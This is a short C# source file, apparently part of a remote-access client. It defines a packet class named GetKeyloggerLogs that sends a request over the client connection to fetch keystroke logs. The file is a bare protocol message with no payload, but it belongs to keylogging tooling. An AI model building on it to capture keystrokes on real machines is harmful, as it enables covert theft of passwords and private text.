using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetKeyloggerLogs : IPacket
{
	public void Execute(Client client)
	{
		client.Send(this);
	}
}
